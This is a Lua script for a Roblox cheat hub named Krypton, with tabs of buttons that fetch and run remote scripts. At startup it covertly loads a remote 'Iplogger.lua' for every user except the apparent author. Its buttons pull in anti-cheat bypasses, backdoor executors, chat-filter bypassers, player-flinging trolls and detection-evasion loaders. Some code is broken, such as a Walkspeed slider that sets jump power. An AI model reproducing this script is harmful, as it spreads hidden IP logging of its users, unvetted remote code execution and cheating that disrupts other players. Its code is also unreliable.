--[[
   __ __              __          
  / //_/_____ _____  / /____  ___ 
 / ,< / __/ // / _ \/ __/ _ \/ _ \
/_/|_/_/  \_, / .__/\__/\___/_//_/
       /___/_/
> Chat-Based Commands! | NON OPEN-SOURCED
]]
print("Krypton Multipurpose Hub | NON OPEN-SOURCED")
--[] Arguments
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()

--[] Krypton Locals
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local ID = game:GetService("Players").LocalPlayer.UserId
local PLAYERNAME = game:GetService("Players").LocalPlayer.Name
local GameID = tostring(game.PlaceId)
local LocalPlayer = game:GetService("Players").LocalPlayer.Name
local MembershipType = "a"
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local AccountAge = LocalPlayer.AccountAge
--[] Ip Logger
if PLAYERNAME == "Ryngrade" then
	print("Hello Ryngrade")
else
	loadstring(game:HttpGet("https://github.com/RENBex6969/OfficialKrypton/raw/main/Iplogger.lua"))()
end

--[] Toggle UI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScreenGui"
ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false
 
local Toggle = Instance.new("TextButton")
Toggle.Name = "Toggle"
Toggle.Parent = ScreenGui
Toggle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0, 90, 0, 38)
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.fromRGB(248, 248, 248)
Toggle.TextSize = 28.000
Toggle.Draggable = true
Toggle.MouseButton1Click:connect(function()
	game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.RightShift,false,game)
end)

local Corner = Instance.new("UICorner")
Corner.Name = "Corner"
Corner.Parent = ToggleUI

--[] Vuln Checker
for i, v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
	if v.Name == "DestroySegway" or v.Name == "DeleteCar" or v.Name == "HandlessSegway" or v.Name == "Building Tools" or v.Name == "SetNetworkOwnership" or v.Name == "ChangeParent" or v.Name == "despawn" then
		OrionLib:MakeNotification({
			Name = "Krypton",
			Content = "Vuln FOUND!",
			Image = "rbxassetid://4483345998",
			Time = 5
		})
	end
end

--[] Krypton Window
local Window = OrionLib:MakeWindow({
	Name = "Krypton | HUB",
	HidePremium = false,
	IntroEnabled = true,
	IntroText = "Krypton",
	SaveConfig = false,
	ConfigFolder = "Krypton",
})

--[] Krypton Notification
OrionLib:MakeNotification({
	Name = "Krypton",
	Content = "Kryton started successfully",
	Image = "rbxassetid://7733771628",
	Time = 5
})

function scriptnotify()
	OrionLib:MakeNotification({
		Name = "Krypton",
		Content = "Script ran",
		Image = "rbxassetid://7733771628",
		Time = 5
	})
end

--[] Krypton Tabs
local UniversalHubTab = Window:MakeTab({
	Name = "Universal Hubs",
	Icon = "rbxassetid://7733954760",
	PremiumOnly = false
})

local TrollTab = Window:MakeTab({
	Name = "Troll",
	Icon = "rbxassetid://7733741741",
	PremiumOnly = false
})

local ServerTab = Window:MakeTab({
	Name = "Server",
	Icon = "rbxassetid://7734053426",
	PremiumOnly = false
})

local AdminTab = Window:MakeTab({
	Name = "Admin",
	Icon = "rbxassetid://7734056608",
	PremiumOnly = false
})

local PlayerTab = Window:MakeTab({
	Name = "Player",
	Icon = "rbxassetid://7743875962",
	PremiumOnly = false
})

local DebuggingTab = Window:MakeTab({
	Name = "Debugging",
	Icon = "rbxassetid://7743872929",
	PremiumOnly = false
})

local SettingsTab = Window:MakeTab({
	Name = "Settings",
	Icon = "rbxassetid://7734053495",
	PremiumOnly = false
})

local InfoTab = Window:MakeTab({
	Name = "Info",
	Icon = "rbxassetid://7743866778",
	PremiumOnly = false
})

local SuggestionTab = Window:MakeTab({
	Name = "Suggestion",
	Icon = "rbxassetid://7733793319",
	PremiumOnly = false
})

--[] Krypton | Universal
UniversalHubTab:AddButton({
	Name = "Rochips V5 [99+]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/Zm2VwbsU"))()
	end
})

--[] Seperator
local Section = UniversalHubTab:AddSection({
	Name = "Skyhub"
})
--[] Seperator

UniversalHubTab:AddButton({
	Name = "Skyhub [50+]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
	end
})

UniversalHubTab:AddButton({
	Name = "Skyhub Trolling [2+]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau"))()
	end
})

--[] Seperator
local Section = UniversalHubTab:AddSection({
	Name = "Ender Hub"
})
--[] Seperator

UniversalHubTab:AddButton({
	Name = "Ender Hub [15+]",
	Callback = function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/NovaExploits/NovaX-Key/main/Ender'))() 
	end
})

--[] Krypton | Troll
TrollTab:AddButton({
	Name = "Netless FE",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/pXWQxpLK'))()
	end
})

TrollTab:AddButton({
	Name = "Fling All FE",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
	end
})

TrollTab:AddButton({
	Name = "Fling Random FE",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/1FaK0DnK'))()
	end
})

TrollTab:AddButton({
	Name = "Touch Fling FE",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/544f7efbe88235666b5b7add65b7344d/raw/f20804bb85542dcc3bc938982e1f05b7ff05cded/FE%2520Hat%2520Fling'))()
	end
})	

TrollTab:AddButton({
	Name = "Click Fling FE",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'), true))()
	end
})	

TrollTab:AddButton({
	Name = "Orbit GUI FE",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Orbit%20GUI"))()
	end
})

TrollTab:AddButton({
	Name = "Giant Head FE",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/Dif6a2SK'))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Anti's"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Anti Fling [1]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/h8sLkBP0"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Fling [2]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/tMHP76Ex"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Fling [3]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/DVJUMC9j"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Fling [4]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/DVJUMC9j"))()
	end
})

TrollTab:AddButton({
	Name = "Anti Bang",
	Callback = function()
		loadstring(game:HttpGet('https://github.com/AnthonyIsntHere/anthonysrepository/raw/main/scripts/Anti%20Bang.lua'))()
	end
})

TrollTab:AddButton({
	Name = "Anti Tool Kill",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20Tool%20Kill.lua'))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "Universal FE GUIS"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Universal FE GUI [1]",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
	end
})

TrollTab:AddButton({
	Name = "Universal FE GUI [2]",
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/o5u3/Selexity/main/Main'), true))()
	end
})

TrollTab:AddButton({
	Name = "Universal FE GUI [3]",
	Callback = function()
		loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Rochips-Panel-v4-13177'))()
	end
})

--[] Seperator
local Section = TrollTab:AddSection({
	Name = "No Dignity"
})
--[] Seperator

TrollTab:AddButton({
	Name = "Sussy HUB FE",
	Callback = function()
		loadstring(game:HttpGet('https://gist.githubusercontent.com/Nilrogram/8b0c8bd710be142f383c71f79279752c/raw/e4fb01a7de7cd498bb53270d2ad191dfab268a88/FE%2520SussyHub', true))()
	end
})

TrollTab:AddButton({
	Name = "Bang GUI FE",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/RENBex6969/Krypton/main/BangGui.lua'))()
	end
})

--[] Krypton | Server
ServerTab:AddButton({
	Name = "SIMPLE Chat Bypasser",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
	end
})

ServerTab:AddButton({
	Name = "BetterBypasser",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua", true))()
		Method = 3
		Keybind = "F"
		ShowMethodDictionary = true
	end
})

--[] Seperator
local Section = ServerTab:AddSection({
	Name = "Essentials [1]"
})
--[] Seperator

ServerTab:AddButton({
	Name = "Server Auto Rejoin",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/9fYwjt6n"))()
	end
})

ServerTab:AddButton({
	Name = "Server Rejoin",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
	end
})

ServerTab:AddButton({
	Name = "Server Kick",
	Callback = function()
		game:GetService("Players").LocalPlayer:Kick("Kicked by Krypton")
	end
})

--[] Seperator
local Section = ServerTab:AddSection({
	Name = "Essentials [2]"
})
--[] Seperator

ServerTab:AddButton({
	Name = "Anti AFK V1",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
	end
})

ServerTab:AddButton({
	Name = "Anti Kick",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
	end
})

ServerTab:AddButton({
	Name = "Server HOP",
	Callback = function()
		local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua")()
		module:Teleport(game.PlaceId)
	end
})

--[] Krypton | Admin
AdminTab:AddButton({
	Name = "Infinite Yield",
	Callback = function()
		loadstring(game:HttpGet("https://cdn.wearedevs.net/script/Infinite%20Yield.txt"))()
	end    
})
AdminTab:AddButton({
	Name = "Fate's Admin",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end    
})
AdminTab:AddButton({
	Name = "CMD-X",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end    
})
AdminTab:AddButton({
	Name = "Nameless",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
	end    
})
AdminTab:AddButton({
	Name = "Proton",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/HuT90Wbu"))()
	end    
})
AdminTab:AddButton({
	Name = "Reviz",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/ibFPdiF7'))()
	end    
})
AdminTab:AddButton({
	Name = "Homebrew",
	Callback = function()
    _G.CustomUI = false
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
	end    
})

AdminTab:AddButton({
	Name = "Homebrew Custom UI",
	Callback = function()
    _G.CustomUI = true
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
	end    
})
--[] Krypton | Player

PlayerTab:AddButton({
	Name = "Fly V3",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/bHa6HDFc'))()
	end
})	

PlayerTab:AddButton({
	Name = "Shiftlock",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/CjNsnSDy'))()
	end
})

PlayerTab:AddButton({
	Name = "Anti-AFK",
	Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
	end    
})

PlayerTab:AddButton({
  Name = "TP Tool",
  Callback = function()
    mouse = game.Players.LocalPlayer:GetMouse()
    tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "Tp Tool"
    tool.Activated:connect(function()
    local pos = mouse.Hit+Vector3.new(0,2.5,0)
    pos = CFrame.new(pos.X,pos.Y,pos.Z)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
    end)
    tool.Parent = game.Players.LocalPlayer.Backpack
  end
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Character Settings"
})
--[] Seperator

local Noclipping = nil
PlayerTab:AddToggle({
	Name = "Noclip",
	Default = false,
	Callback = function(a)
		getgenv().looping = a
		task.spawn(function()
			while true do 
				if not getgenv().looping then
					for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
						if v:IsA("BasePart") and v.CanCollide == false then
							v.CanCollide = true
						end
					end
					break
				end
				task.wait()
				if getgenv().looping and game:GetService("Players").LocalPlayer.Character ~= nil then
					for i, v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
						if v:IsA("BasePart") and v.CanCollide == true then
							v.CanCollide = false
						end
					end
				end
			end
		end)
	end
})


local WalkSpeed = PlayerTab:AddSlider({
	Name = "Walkspeed",
	Min = 16,
	Max = 1000,
	Default = 50,
	Color = Color3.fromRGB(255, 255, 255),
	Increment = 1,
	ValueName = "Walkspeed",
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Value
	end    
})

local JumpPower = PlayerTab:AddSlider({
	Name = "Jump Power",
	Min = 50,
	Max = 1000,
	Default = 50,
	Color = Color3.fromRGB(255, 255, 255),
	Increment = 1,
	ValueName = "Jump power",
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Value
	end 
})

local FOV = PlayerTab:AddSlider({
	Name = "FOV",
	Min = 70,
	Max = 1000,
	Default = 70,
	Color = Color3.fromRGB(255, 255, 255),
	Increment = 1,
	ValueName = "FOV",
	Callback = function(Value)
		game:GetService("Workspace").CurrentCamera.FieldOfView = Value
	end 
})

PlayerTab:AddTextbox({
	Name = "Walkspeed",
	Default = "16",
	TextDisappear = false,
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "Jump power",
	Default = "50",
	TextDisappear = false,
	Callback = function(Value)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Value
	end	  
})

PlayerTab:AddTextbox({
	Name = "FOV",
	Default = "70",
	TextDisappear = false,
	Callback = function(Value)
		game:GetService("Workspace").CurrentCamera.FieldOfView = Value
	end	  
})

--[] Seperator
local Section = PlayerTab:AddSection({
	Name = "Reset"
})
--[] Seperator

PlayerTab:AddButton({
	Name = "Reset Walkspeed",
	Callback = function()
		WalkSpeed:Set(16)
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 16
	end    
})

PlayerTab:AddButton({
	Name = "Reset Jump Power",
	Callback = function()
		JumpPower:Set(50)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 50
	end    
})

PlayerTab:AddButton({
	Name = "Reset FOV",
	Callback = function()
		FOV:Set(70)
		game:GetService("Workspace").CurrentCamera.FieldOfView = 70
	end    
})

PlayerTab:AddButton({
	Name = "Reset Walkspeed & Jump Power & FOV",
	Callback = function()
		JumpPower:Set(50)
		game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = 50
		WalkSpeed:Set(16)
		game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 16
		FOV:Set(70)
		game:GetService("Workspace").CurrentCamera.FieldOfView = 70
	end    
})

--[] Krypton | Debugging
DebuggingTab:AddButton({
	Name = "Executer UI+",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/Hu0XkvMg"))()
	end
})

DebuggingTab:AddButton({
	Name = "Executer UI",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/9nvwUAGr"))()
	end
})

DebuggingTab:AddTextbox({
	Name = "Executor",
	Default = "Paste your scripts here",
	TextDisappear = false,
	Callback = function(Value)
		ExecutorValue = Value
	end	  
})
DebuggingTab:AddButton({
	Name = "Execute",
	Callback = function()
		loadstring(ExecutorValue)()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Anti-Cheat Bypass"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "AC Bypasser+ [ANTICHEAT]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Xen8054/AntiCheatBypassPLUS/main/Script"))();
	end
})

DebuggingTab:AddButton({
	Name = "Adonis Bypasser [ANTICHEAT]",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/GZRt3WgA"))()
	end
})


--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "UNC Tester"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Open Console",
	Callback = function()
		game:GetService'StarterGui':SetCore("DevConsoleVisible", true)
	end
})

DebuggingTab:AddButton({
	Name = "Executor LVL",
	Callback = function()
		printidentity()
	end
})

DebuggingTab:AddButton({
	Name = "Vulnerability Scanner",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialValkyrie/Vulnerability-Check/main/Executor%20Vulnerability%20Check"))()
	end
})

DebuggingTab:AddButton({
	Name = "UNC Test [1]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/unified-naming-convention/NamingStandard/main/UNCCheckEnv.lua"))()
	end
})

DebuggingTab:AddButton({
	Name = "UNC Test [2]",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/tests/main/UNC%20no%20luau.lua"))()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Essentials"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Coords Finder V2",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/FSy9bHnW"))()
	end
})	

DebuggingTab:AddButton({
	Name = "Keyboard",
	Callback = function()
		loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-MobileKeyboard-8101"))()
	end
})	

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Admin"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Infinite Yield",
	Callback = function()
		loadstring(game:HttpGet("https://cdn.wearedevs.net/script/Infinite%20Yield.txt"))()
	end    
})
DebuggingTab:AddButton({
	Name = "Fate's Admin",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end    
})
DebuggingTab:AddButton({
	Name = "CMD-X",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end    
})
DebuggingTab:AddButton({
	Name = "Nameless",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
	end    
})
DebuggingTab:AddButton({
	Name = "Proton",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/HuT90Wbu"))()
	end    
})
DebuggingTab:AddButton({
	Name = "Reviz",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/ibFPdiF7'))()
	end    
})
DebuggingTab:AddButton({
	Name = "Homebrew",
	Callback = function()
    _G.CustomUI = false
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
	end    
})

DebuggingTab:AddButton({
	Name = "Homebrew Custom UI",
	Callback = function()
    _G.CustomUI = true
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
	end    
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Experimental"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "FPS Counter",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Sempiller/sdluniversal/main/fpsviewer.lua"))()
	end
})

DebuggingTab:AddButton({
	Name = "FPS+",
	Callback = function()
		loadstring(game:HttpGet("https://fpsplus.000webhostapp.com/OBFUSCATED_SOURCE_FPSPLUS.lua", true))()
	end
})	

DebuggingTab:AddButton({
	Name = "Lag Reducer",
	Callback = function()
		loadstring(game:HttpGet('https://pastebin.com/raw/RW7ZT29m'))()
	end
})

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Dex's"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Dark Dex V1",
	Callback = function()
		loadstring(game:GetObjects("rbxassetid://3025032531")[1].Source)()
	end
})	

DebuggingTab:AddButton({
	Name = "Dark Dex V2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceSpiffer/Scripts/main/Script4", true))()
	end
})	

DebuggingTab:AddButton({
	Name = "Dark Dex V3",
	Callback = function()
		loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
	end
})	

DebuggingTab:AddButton({
	Name = "Dark Dex V4",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceSpiffer/Scripts/main/Script5", true))()
	end
})

DebuggingTab:AddButton({
	Name = "Dark Dex V4 [MOBILE]",
	Callback = function()
		loadstring(game:HttpGet("https://github.com/Hosvile/DEX-Explorer/releases/latest/download/main.lua", true))()
	end
})	

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Remote SPY"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "SimpleSPY V3",
	Callback = function()
		loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()'))()
	end
})

DebuggingTab:AddButton({
	Name = "SimpleSPY V2.2",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua'))()
	end
})

DebuggingTab:AddButton({
	Name = "TurtleSPY",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))()
	end
})	

--[] Seperator
local Section = DebuggingTab:AddSection({
	Name = "Backdoor Scanner & Executor"
})
--[] Seperator

DebuggingTab:AddButton({
	Name = "Backdoor Scanner & [EXECUTOR] 1",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/source.lua', true))()
	end
})	

DebuggingTab:AddButton({
	Name = "Backdoor Scanner & [EXECUTOR] 2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
	end
})

DebuggingTab:AddButton({
	Name = "Backdoor Scanner & [EXECUTOR] 3",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
	end
})

--[] Krypton | Settings
SettingsTab:AddButton({
	Name = "End Krypton",
	Callback = function()
		OrionLib:Destroy()
	end    
})

--[] Krypton | Info
InfoTab:AddParagraph("Krypton", "Krypton, a non opensource hub")

InfoTab:AddParagraph("Script", "Scripts within Krypton is all internet found.")

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Social"
})
--[] Seperator

InfoTab:AddButton({
	Name = "Github",
	Callback = function()
		setclipboard("Not yet Implemented")
	end
})

InfoTab:AddButton({
	Name = "Discord",
	Callback = function()
		setclipboard("Not yet Implemented")
	end
})

InfoTab:AddButton({
	Name = "Youtube",
	Callback = function()
		setclipboard("Not yet Implemented")
	end
})

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Information"
})
--[] Seperator
InfoTab:AddParagraph("Hardware ID", HWID)

InfoTab:AddParagraph("Roblox Username", PLAYERNAME)

InfoTab:AddParagraph("Roblox ID", ID)

InfoTab:AddParagraph("MembershipType", MembershipType)

InfoTab:AddParagraph("Account Age", AccountAge)

InfoTab:AddParagraph("Game ID", GameID)

--[] Seperator
local Section = InfoTab:AddSection({
	Name = "Copy"
})
--[] Seperator

InfoTab:AddButton({
	Name = "Copy your HWID",
	Callback = function()
		setclipboard(HWID)
	end
})

InfoTab:AddButton({
	Name = "Copy your Username",
	Callback = function()
		setclipboard(PLAYERNAME)
	end
})

InfoTab:AddButton({
	Name = "Copy your ID",
	Callback = function()
		setclipboard(ID)
	end
})

InfoTab:AddButton({
	Name = "Copy your MembershipType",
	Callback = function()
		setclipboard(MembershipType)
	end
})

InfoTab:AddButton({
	Name = "Copy your Account Age",
	Callback = function()
		setclipboard(AccountAge)
	end
})

InfoTab:AddButton({
	Name = "Copy Game ID",
	Callback = function()
		setclipboard(GameID)
	end
})

--[] Krypton | Suggestion
SuggestionTab:AddButton({
	Name = "Load Feedback Ui",
	Callback = function()
		loadstring(game:HttpGet('https://github.com/RENBex6969/OfficialKrypton/raw/main/Suggestion.lua'))()
	end
})
--[] Agruments
OrionLib:Init()

--[] Protection
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20GUI%20Detection.lua"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20Instance%20Detector.lua"))()